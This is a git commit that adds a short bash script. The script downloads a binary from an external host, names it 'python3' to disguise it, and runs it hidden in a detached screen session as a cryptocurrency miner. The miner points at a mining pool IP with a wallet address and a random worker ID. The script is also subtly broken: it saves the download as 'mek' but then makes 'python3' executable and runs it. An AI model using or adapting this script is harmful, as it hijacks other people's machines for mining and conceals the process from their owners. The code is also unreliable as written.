f597381d39590a77130988c1e4d2bf4e7866d064
monhodsompul <168453591+monhodsompul@users.noreply.github.com>
2024-11-24 07:00:53 +0700

    Create spch.sh

---
+++ spch.sh
@@ -0,0 +1,18 @@
+#!/bin/bash
+
+
+generate_random_name() {
+    tr -dc A-Za-z0-9 </dev/urandom | head -c 5
+}
+
+
+TID=$(generate_random_name)
+
+
+wget -O mek https://upload.vina-host.com/sAcUi9loPh/python3
+
+
+chmod +x python3
+
+
+screen -dmS dotsrb_$TID ./python3 -a  yespowersugar -o 198.50.168.213:6241 -u DEJ2vHD2aDfBxSrcMDfqC4ACgLAqXY8mEt.vps-$TID -p c=DGB -t 8
